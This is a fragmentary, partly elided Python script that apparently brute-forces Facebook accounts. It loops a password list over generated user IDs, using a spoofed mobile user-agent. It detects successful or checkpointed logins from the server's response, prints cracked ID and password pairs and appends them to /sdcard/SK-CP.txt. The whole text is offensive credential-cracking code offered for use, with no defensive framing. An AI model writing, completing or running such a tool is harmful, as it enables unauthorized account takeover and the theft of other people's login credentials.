...
def pak():
		user=[]
		clear()
		print('\033[1;35m Code example: 0300,0318,0334,0345')
...
'Content-Length': '706'}
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'y' in pcp:
                                                ...
                                                twf.append(ids)
                                                break
                        elif 'www.free.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;205m [SK-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/SK-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
...
def trt6(ids,passlist):
	...
	try:
		for pas in passlist:
            ...
            'user-agent': 'Mozilla/5.0 (Android; Tablet; rv:121.0) Gecko/121.0 Firefox/121.0',
}
